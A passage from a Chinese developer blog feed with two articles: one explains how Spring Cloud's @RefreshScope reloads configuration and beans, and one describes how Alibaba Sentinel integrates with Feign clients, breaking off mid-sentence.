      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20@RefreshScope%20%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h4 id="要清楚RefreshScope-先要了解Scope"><a href="#要清楚RefreshScope-先要了解Scope" class="headerlink" title="要清楚RefreshScope,先要了解Scope"></a>要清楚RefreshScope,先要了解Scope</h4><p>Scope(org.springframework.beans.factory.config.Scope)是Spring 2.0开始就有的核心的概念</p><p>RefreshScope(org.springframework.cloud.context.scope.refresh)是spring cloud提供的一种特殊的scope实现，用来实现配置、实例热加载。</p><p>Scope -&gt; GenericScope -&gt; RefreshScope</p><p><img src="http://img.javastack.cn/20191214133725.png"></p><p><strong>Scope与ApplicationContext生命周期</strong></p><p>AbstractBeanFactory#doGetBean创建Bean实例</p><pre class="line-numbers language-none"><code class="language-none">protected &lt;T&gt; T doGetBean(...)&#123;    final RootBeanDefinition mbd &#x3D; ...    if (mbd.isSingleton()) &#123;        ...    &#125; else if (mbd.isPrototype())       ...    &#125; else &#123;          String scopeName &#x3D; mbd.getScope();          final Scope scope &#x3D; this.scopes.get(scopeName);          Object scopedInstance &#x3D; scope.get(beanName, new ObjectFactory&lt;Object&gt;() &#123;...&#125;);          ...    &#125;    ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Singleton和Prototype是硬编码的，并不是Scope子类。 </p><p>Scope实际上是自定义扩展的接口，Scope Bean实例交由Scope自己创建，例如SessionScope是从Session中获取实例的，ThreadScope是从ThreadLocal中获取的，而RefreshScope是在内建缓存中获取的。</p><p><strong>@Scope 对象的实例化</strong></p><p>@RefreshScope 是scopeName&#x3D;”refresh”的 @Scope</p><pre class="line-numbers language-none"><code class="language-none">...@Scope(&quot;refresh&quot;)public @interface RefreshScope &#123;  ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>@Scope 的注册 AnnotatedBeanDefinitionReader#registerBean</p><pre class="line-numbers language-none"><code class="language-none">public void registerBean(...)&#123;...ScopeMetadata scopeMetadata &#x3D; this.scopeMetadataResolver.resolveScopeMetadata(abd);  abd.setScope(scopeMetadata.getScopeName());  ...  definitionHolder &#x3D; AnnotationConfigUtils.applyScopedProxyMode(scopeMetadata, definitionHolder, this.registry);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>读取@Scope元数据， AnnotationScopeMetadataResolver#resolveScopeMetadata</p><pre class="line-numbers language-none"><code class="language-none">public ScopeMetadata resolveScopeMetadata(BeanDefinition definition) &#123;  AnnotationAttributes attributes &#x3D; AnnotationConfigUtils.attributesFor(  annDef.getMetadata(), Scope.class);  if (attributes !&#x3D; null) &#123;      metadata.setScopeName(attributes.getString(&quot;value&quot;));      ScopedProxyMode proxyMode &#x3D; attributes.getEnum(&quot;proxyMode&quot;);      if (proxyMode &#x3D;&#x3D; null || proxyMode &#x3D;&#x3D; ScopedProxyMode.DEFAULT) &#123;          proxyMode &#x3D; this.defaultProxyMode;      &#125;      metadata.setScopedProxyMode(proxyMode);  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Scope实例对象通过ScopedProxyFactoryBean创建，其中通过AOP使其实现ScopedObject接口，这里不再展开。</p><h4 id="说RefreshScope是如何实现配置和实例刷新的"><a href="#说RefreshScope是如何实现配置和实例刷新的" class="headerlink" title="说RefreshScope是如何实现配置和实例刷新的"></a>说RefreshScope是如何实现配置和实例刷新的</h4><p><strong>RefreshScope注册</strong></p><blockquote><p>RefreshAutoConfiguration#RefreshScopeConfiguration</p></blockquote><pre class="line-numbers language-none"><code class="language-none">@Component@ConditionalOnMissingBean(RefreshScope.class)protected static class RefreshScopeConfiguration implements BeanDefinitionRegistryPostProcessor&#123;...  registry.registerBeanDefinition(&quot;refreshScope&quot;,  BeanDefinitionBuilder.genericBeanDefinition(RefreshScope.class)                      .setRole(BeanDefinition.ROLE_INFRASTRUCTURE)                      .getBeanDefinition());...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>RefreshScope extends GenericScope, 大部分逻辑在 GenericScope 中。</p><p>GenericScope#postProcessBeanFactory 中向AbstractBeanFactory注册自己</p><pre class="line-numbers language-none"><code class="language-none">public class GenericScope implements Scope, BeanFactoryPostProcessor...&#123;  @Override  public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory)      throws BeansException &#123;      beanFactory.registerScope(this.name&#x2F;*refresh*&#x2F;, this&#x2F;*RefreshScope*&#x2F;);      ...  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>RefreshScope 刷新过程</strong></p><p>入口在ContextRefresher#refresh</p><pre class="line-numbers language-none"><code class="language-none">refresh() &#123;  Map&lt;String, Object&gt; before &#x3D; ①extract(          this.context.getEnvironment().getPropertySources());  ②addConfigFilesToEnvironment();  Set&lt;String&gt; keys &#x3D; ④changes(before,          ③extract(this.context.getEnvironment().getPropertySources())).keySet();  this.context.⑤publishEvent(new EnvironmentChangeEvent(keys));  this.scope.⑥refreshAll(); &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>①提取标准参数(SYSTEM,JNDI,SERVLET)之外所有参数变量</p><p>②把原来的Environment里的参数放到一个新建的Spring Context容器下重新加载，完事之后关闭新容器</p><p>③提起更新过的参数(排除标准参数)</p><p>④比较出变更项</p><p>⑤发布环境变更事件,接收：EnvironmentChangeListener／LoggingRebinder</p><p>⑥RefreshScope用新的环境参数重新生成Bean，重新生成的过程很简单，清除refreshscope缓存幷销毁Bean，下次就会重新从BeanFactory获取一个新的实例（该实例使用新的配置）</p><p>RefreshScope#refreshAll</p><pre class="line-numbers language-none"><code class="language-none">public void refreshAll() &#123;      &lt;b&gt;super.destroy();&lt;&#x2F;b&gt;      this.context.publishEvent(new RefreshScopeRefreshedEvent());&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>GenericScope#destroy</p><pre class="line-numbers language-none"><code class="language-none">public void destroy() &#123;  ...  Collection&lt;BeanLifecycleWrapper&gt; wrappers &#x3D; &lt;b&gt;this.cache.clear()&lt;&#x2F;b&gt;;  for (BeanLifecycleWrapper wrapper : wrappers) &#123;      &lt;b&gt;wrapper.destroy();&lt;&#x2F;b&gt;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Spring Cloud Bus 如何触发 Refresh</strong></p><p>BusAutoConfiguration#BusRefreshConfiguration 发布一个RefreshBusEndpoint</p><pre class="line-numbers language-none"><code class="language-none">@Configuration@ConditionalOnClass(&#123; Endpoint.class, RefreshScope.class &#125;)protected static class BusRefreshConfiguration &#123;  @Configuration  @ConditionalOnBean(ContextRefresher.class)  @ConditionalOnProperty(value &#x3D; &quot;endpoints.spring.cloud.bus.refresh.enabled&quot;, matchIfMissing &#x3D; true)  protected static class BusRefreshEndpointConfiguration &#123;      @Bean      public RefreshBusEndpoint refreshBusEndpoint(ApplicationContext context,              BusProperties bus) &#123;          return new RefreshBusEndpoint(context, bus.getId());      &#125;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>RefreshBusEndpoint 会从http端口触发广播RefreshRemoteApplicationEvent事件</p><pre class="line-numbers language-none"><code class="language-none">@Endpoint(id &#x3D; &quot;bus-refresh&quot;)public class RefreshBusEndpoint extends AbstractBusEndpoint &#123;   public void busRefresh() &#123;      publish(new RefreshRemoteApplicationEvent(this, getInstanceId(), null));  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>BusAutoConfiguration#refreshListener 负责接收事件(所有配置bus的节点)</p><pre class="line-numbers language-none"><code class="language-none">@Bean@ConditionalOnProperty(value &#x3D; &quot;spring.cloud.bus.refresh.enabled&quot;, matchIfMissing &#x3D; true)@ConditionalOnBean(ContextRefresher.class)public RefreshListener refreshListener(ContextRefresher contextRefresher) &#123;  return new RefreshListener(contextRefresher);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>RefreshListener#onApplicationEvent 触发 ContextRefresher</p><pre class="line-numbers language-none"><code class="language-none">public void onApplicationEvent(RefreshRemoteApplicationEvent event) &#123;  Set&lt;String&gt; keys &#x3D; contextRefresher.refresh();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>大部分需要更新的服务需要打上@RefreshScope, EurekaClient是如何配置更新的</strong></p><blockquote><p>EurekaClientAutoConfiguration#RefreshableEurekaClientConfiguration</p></blockquote><pre class="line-numbers language-none"><code class="language-none">@Configuration@ConditionalOnRefreshScopeprotected static class RefreshableEurekaClientConfiguration&#123;  @Bean  @RefreshScope  public EurekaClient eurekaClient(...) &#123;      return new CloudEurekaClient(manager, config, this.optionalArgs,              this.context);  &#125;    @Bean  @RefreshScope  public ApplicationInfoManager eurekaApplicationInfoManager(...) &#123;      ...      return new ApplicationInfoManager(config, instanceInfo);  &#125;  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>作者：黄大海<br><a href="https://www.jianshu.com/p/188013dd3d02">https://www.jianshu.com/p/188013dd3d02</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Spring Cloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud Alibaba Sentinel 整合 Feign 的设计实现</title>
      <link href="/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20Alibaba%20Sentinel%20%E6%95%B4%E5%90%88%20Feign%20%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/"/>
      <url>/2025/10/29/%E5%90%8E%E7%AB%AF%E6%8A%80%E6%9C%AF/Spring%20Cloud/Spring%20Cloud%20Alibaba%20Sentinel%20%E6%95%B4%E5%90%88%20Feign%20%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><blockquote><p>作者 | Spring Cloud Alibaba 高级开发工程师洛夜<br>来自公众号阿里巴巴中间件投稿</p></blockquote></blockquote><p>前段时间 Hystrix 宣布不再维护之后（<a href="https://mp.weixin.qq.com/s/WPb8yUYPyvDCKJVb--W63Q">Hystrix 停止开发。。。Spring Cloud 何去何从？</a>），Feign 作为一个跟 Hystrix 强依赖的组件，必然会有所担心后续的使用。</p><p>作为 Spring Cloud Alibaba 体系中的熔断器 Sentinel，Sentinel 目前整合了 Feign，本文对整合过程做一次总结，欢迎大家讨论和使用。</p><h2 id="Feign-是什么？"><a href="#Feign-是什么？" class="headerlink" title="Feign 是什么？"></a>Feign 是什么？</h2><p>Feign 是一个 Java 实现的 Http 客户端，用于简化 Restful 调用。</p><p>Feign 跟 OkHttp、HttpClient 这种客户端实现理念不一样。Feign 强调接口的定义，接口中的一个方法对应一个 Http 请求，调用方法即发送一个 Http 请求；OkHttp 或 HttpClient 以过程式的方式发送 Http 请求。Feign 底层发送请求的实现可以跟 OkHttp 或 HttpClient 整合。</p><p>要想整合 Feign，首先要了解 Feign 的使用以及执行过程，然后看 Sentinel 如何整合进去。</p><h2 id="Feign-的使用"><a href="#Feign-的使用" class="headerlink" title="Feign 的使用"></a>Feign 的使用</h2><p>需要两个步骤：</p><h4 id="1、使用-EnableFeignClients-注解开启-Feign-功能"><a href="#1、使用-EnableFeignClients-注解开启-Feign-功能" class="headerlink" title="1、使用 @EnableFeignClients 注解开启 Feign 功能"></a>1、使用 <code>@EnableFeignClients</code> 注解开启 Feign 功能</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@SpringBootApplication</span><span class="token annotation punctuation">@EnableFeignClients</span> <span class="token comment">// 开启 Feign 功能</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyApplication</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>@EnableFeignClients</code> 属性介绍：</p><p>value:String[] 包路径。比如 <code>org.my.pkg</code>，会扫描这个包路径下带有 <code>@FeignClient</code> 注解的类并处理；</p><p>basePackages:String[] 跟 value 属性作用一致；</p><p>basePackageClasses:Class&lt;?&gt;[] 跟 basePackages 作用一致，basePackages 是个 String 数组，而 basePackageClasses 是个 Class 数组，用于扫描这些类对应的 package；</p><p>defaultConfiguration:Class&lt;?&gt;[] 默认的配置类，对于所有的 Feign Client，这些配置类里的配置都会对它们生效，可以在配置类里构造 <code>feign.codec.Decoder</code>, <code>feign.codec.Encoder</code> 或 <code>feign.Contract</code> 等bean;</p><p>clients:Class&lt;?&gt;[] 表示 <code>@FeignClient</code>； 注解修饰的类集合，如果指定了该属性，那么扫描功能相关的属性就是失效。比如 value、basePackages 和 basePackageClasses；</p><h4 id="2、使用-FeignClient-注解修饰接口，这样会基于跟接口生成代理类"><a href="#2、使用-FeignClient-注解修饰接口，这样会基于跟接口生成代理类" class="headerlink" title="2、使用 @FeignClient 注解修饰接口，这样会基于跟接口生成代理类"></a>2、使用 <code>@FeignClient</code> 注解修饰接口，这样会基于跟接口生成代理类</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@FeignClient</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"service-provider"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">EchoService</span> <span class="token punctuation">&#123;</span>  <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/echo/&#123;str&#125;"</span><span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token class-name">RequestMethod</span><span class="token punctuation">.</span><span class="token constant">GET</span><span class="token punctuation">)</span>  <span class="token class-name">String</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token annotation punctuation">@PathVariable</span><span class="token punctuation">(</span><span class="token string">"str"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只要确保这个被 <code>@FeignClient</code> 注解修饰到的接口能被 <code>@EnableFeignClients</code> 注解扫描到，就会基于 <code>java.lang.reflect.Proxy</code> 根据这个接口生成一个代理类。</p><p>生成代理类之后，会被注入到 <code>ApplicationContext</code> 中，直接 AutoWired 就能使用，使用的时候调用 <code>echo</code> 方法就相当于是发起一个 Restful 请求。</p><p><code>@FeignClient</code> 属性介绍：</p><p>value:String 服务名。比如 <code>service-provider</code>, <code>http://service-provider</code>。比如 <code>EchoService</code> 中如果配置了 <code>value=service-provider</code>，那么调用 <code>echo</code> 方法的 url 为  <code>http://service-provider/echo</code>；如果配置了 <code>value=https://service-provider</code>，那么调用 <code>echo</code> 方法的 url 为 <code>https://service-provider/divide</code></p><p>serviceId:String 该属性已过期，但还能用。作用跟 value 一致<br>name:String 跟 value 属性作用一致</p><p>qualifier:String 给 FeignClient 设置 <code>@Qualifier</code> 注解</p><p>url:String 绝对路径，用于替换服务名。优先级比服务名高。比如 <code>EchoService</code> 中如果配置了 <code>url=aaa</code>，那么调用 <code>echo</code> 方法的 url 为  <code>http://aaa/echo</code>；如果配置了 <code>url=https://aaa</code>，那么调用 <code>echo</code> 方法的 url 为 <code>https://aaa/divide</code></p><p>decode404:boolean 默认是 false，表示对于一个 http status code 为 404 的请求是否需要进行 decode，默认不进行 decode，当成一个异常处理。设置为true之后，遇到 404 的 response 还是会解析 body</p><p>configuration:Class&lt;?&gt;[] 跟 <code>@EnableFeignClients</code>  注解的 <code>defaultConfiguration</code> 属性作用一致，但是这个对于单个 FeignClient 的配置，而 <code>@EnableFeignClients</code>  里的 <code>defaultConfiguration</code> 属性是作用域全局的，针对所有的 FeignClient</p><p>fallback:Class&lt;?&gt; 默认值是 <code>void.class</code>，表示 fallback 类，需要实现 FeignClient 对应的接口，当调用方法发生异常的时候会调用这个 Fallback 类对应的 FeignClient 接口方法。</p><p>如果配置了 fallback 属性，那么会把这个 Fallback 类包装在一个默认的 <code>FallbackFactory</code> 实现类 <code>FallbackFactory.Default</code> 上，而不使用 fallbackFactory 属性对应的 <code>FallbackFactory</code> 实现类</p><p>fallbackFactory:Class&lt;?&gt; 默认值是 <code>void.class</code>，表示生产 fallback 类的 Factory，可以实现 <code>feign.hystrix.FallbackFactory</code> 接口，<code>FallbackFactory</code> 内部会针对一个 <code>Throwable</code> 异常返回一个 Fallback 类进行 fallback 操作</p><p>path:String 请求路径。 在服务名或 url 与 requestPath 之间</p><p>primary:boolean 默认是 true，表示当前这个 FeignClient 生成的 bean 是否是 primary。 </p><p><strong>所以如果在 <code>ApplicationContext</code>中存在一个实现 <code>EchoService</code> 接口的 Bean，但是注入的时候并不会使用该Bean，因为 FeignClient 生成的 Bean 是 primary</strong></p><h2 id="Feign-的执行过程"><a href="#Feign-的执行过程" class="headerlink" title="Feign 的执行过程"></a>Feign 的执行过程</h2><p>了解了 Feign 的使用之后，接下来我们来看 Feign 构造一个 Client 的过程。</p><p>从 <code>@EnableFeignClients</code> 注解可以看到，入口在该注解上的 <code>FeignClientsRegistrar</code> 类上，整个链路是这样的：</p><p><img src="https://cdn.nlark.com/lark/0/2018/png/64647/1544585446790-8affc733-701e-4ff1-819b-c8b7980de337.png" alt="Feign.png"> </p><p>从这个链路上我们可以得到几个信息：</p><p>1.<code>@FeignClient</code> 注解修饰的接口最终会被转换成 <code>FeignClientFactoryBean</code> 这个 <code>FactoryBean</code>，<code>FactoryBean </code>内部的 getObject 方法最终会返回一个 Proxy</p><p>2.在构造 Proxy 的过程中会根据 <code>org.springframework.cloud.openfeign.Targeter</code> 接口的 <code>target</code> 方法去构造。如果启动了hystrix开关(<code>feign.hystrix.enabled=true</code>)，会使用 <code>HystrixTargeter</code>，否则使用默认的 <code>DefaultTargeter</code></p><p>3.<code>Targeter</code> 内部构造 Proxy 的过程中会使用 <code>feign.Feign.Builder</code> 去调用它的 <code>build</code> 方法构造 <code>feign.Feign</code> 实例(默认只有一个子类 <code>ReflectiveFeign</code>)。</p><p>如果启动了 hystrix 开关(<code>feign.hystrix.enabled=true</code>)，会使用 <code>feign.hystrix.HystrixFeign.Builder</code>，否则使用默认的<code>feign.Feign.Builder</code></p><p>4.构造出 <code>feign.Feign</code> 实例之后，调用 <code>newInstance</code> 方法返回一个 Proxy</p><p>简单看下这个 <code>newInstance</code> 方法内部的逻辑：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token class-name">T</span> <span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">MethodHandler</span><span class="token punctuation">></span></span> nameToHandler <span class="token operator">=</span> targetToHandlersByName<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Method</span><span class="token punctuation">,</span> <span class="token class-name">MethodHandler</span><span class="token punctuation">></span></span> methodToHandler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedHashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Method</span><span class="token punctuation">,</span> <span class="token class-name">MethodHandler</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">DefaultMethodHandler</span><span class="token punctuation">></span></span> defaultMethodHandlers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">DefaultMethodHandler</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Method</span> method <span class="token operator">:</span> target<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getDeclaringClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">Util</span><span class="token punctuation">.</span><span class="token function">isDefault</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">DefaultMethodHandler</span> handler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultMethodHandler</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>        defaultMethodHandlers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>handler<span class="token punctuation">)</span><span class="token punctuation">;</span>        methodToHandler<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        methodToHandler<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> nameToHandler<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Feign</span><span class="token punctuation">.</span><span class="token function">configKey</span><span class="token punctuation">(</span>target<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 使用 InvocationHandlerFactory 根据接口的方法信息和 target 对象构造 InvocationHandler</span>    <span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> methodToHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 构造代理</span>    <span class="token class-name">T</span> proxy <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>target<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>target<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">DefaultMethodHandler</span> defaultMethodHandler <span class="token operator">:</span> defaultMethodHandlers<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      defaultMethodHandler<span class="token punctuation">.</span><span class="token function">bindTo</span><span class="token punctuation">(</span>proxy<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> proxy<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的 <code>InvocationHandlerFactory</code> 是通过构造 <code>Feign</code> 的时候传入的：</p><ul><li><p>使用原生的 <code>DefaultTargeter</code>: 那么会使用 <code>feign.InvocationHandlerFactory.Default</code> 这个 factory，并且构造出来的 <code>InvocationHandler</code> 是 <code>feign.ReflectiveFeign.FeignInvocationHandler</code></p></li><li><p>使用 hystrix 的 <code>HystrixTargeter</code>: 那么会在<code>feign.hystrix.HystrixFeign.Builder#build(feign.hystrix.FallbackFactory&lt;?&gt;)</code> 方法中调用父类的 <code>invocationHandlerFactory</code> 方法传入一个匿名的 <code>InvocationHandlerFactory</code> 实现类，该类内部构造出的 <code>InvocationHandler</code> 为 <code>HystrixInvocationHandler</code></p></li></ul><h1 id="Sentinel-整合-Feign"><a href="#Sentinel-整合-Feign" class="headerlink" title="Sentinel 整合 Feign"></a>Sentinel 整合 Feign</h1><p>理解了 Feign 的执行过程之后，Sentinel 想要整合 Feign，可以参考 Hystrix 的实现：</p><p>1.❌ 实现 <code>Targeter</code> 接口 <code>SentinelTargeter</code>。 <strong>很不幸，<code>Targeter</code> 这个接口属于包级别的接口，在外部包中无法使用，这个 <code>Targeter</code> 无法使用。没关系，我们可以沿用默认的<code> HystrixTargeter</code>(实际上会用 <code>DefaultTargeter</code>，下文 Note 有解释)</strong></p><p>2.✅  <code>FeignClientFactoryBean</code> 内部构造 <code>Targeter</code>、<code>feign.Feign.Builder</code> 的时候，都会从 <code>FeignContext</code> 中获取。所以我们沿用默认的 <code>DefaultTargeter</code> 的时候，内部使用的 <code>feign.Feign.Builder</code> 可控，而且这个 Builder 不是包级别的类，可在外部使用</p><ul><li><p>创建 <code>SentinelFeign.Builder</code> 继承 <code>feign.Feign.Builder</code> ，用来构造 <code>Feign</code></p></li><li><p><code>SentinelFeign.Builder</code> 内部需要获取 <code>FeignClientFactoryBean</code> 中的属性进行处理，比如获取 <code>fallback</code>, <code>name</code>, <code>fallbackFactory</code>。</p></li></ul><p><strong>很不幸，<code>FeignClientFactoryBean</code> 这个类也是包级别的类。没关系，我们知道它存在在 <code>ApplicationContext</code> 中的 beanName， 拿到 bean 之后根据反射获取属性就行(该过程在初始化的时候进行，不会在调用的时候进行，所以不会影响性能)</strong></p><ul><li><code>SentinelFeign.Builder</code> 调用 <code>build</code> 方法构造 <code>Feign</code> 的过程中，我们不需要实现一个新的 <code>Feign</code>，跟 hystrix 一样沿用 <code>ReflectiveFeign</code> 即可，在沿用的过程中调用父类 <code>feign.Feign.Builder</code> 的一些方法进行改造即可，比如 <code>invocationHandlerFactory</code> 方法设置 <code>InvocationHandlerFactory</code> ，<code>contract</code> 的调用</li></ul><p>3.✅ 跟 hystrix 一样实现自定义的 <code>InvocationHandler</code> 接口 <code>SentinelInvocationHandler</code> 用来处理方法的调用 </p><p>4.✅ <code>SentinelInvocationHandler</code> 内部使用 Sentinel 进行保护，这个时候涉及到资源名的获取。<code>SentinelInvocationHandler</code> 内部的 <code>feign.Target</code> 能获取服务名信息，<code>feign.InvocationHandlerFactory.MethodHandler</code> 的实现类 <code>feign.SynchronousMethodHandler</code> 能拿到对应的请求路径信息。</p><p><strong>很不幸，<code>feign.SynchronousMethodHandler</code> 这个类也是包级别的类。没关系，我们可以自定义一个 <code>feign.Contract</code> 的实现类 <code>SentinelContractHolder</code> 在处理 <code>MethodMetadata</code> 的过程把这些 metadata 保存下来</strong>(<code>feign.Contract</code> 这个接口在 Builder 构造 Feign 的过程中会对方法进行解析并验证)。</p><p>在 <code>SentinelFeign.Builder</code> 中调用 <code>contract</code> 进行设置，<code>SentinelContractHolder</code> 内部保存一个 <code>Contract</code> 使用委托方式不影响原先的 <code>Contract</code> 过程</p><p>Note:  <code>spring-cloud-starter-openfeign</code> 依赖内部包含了 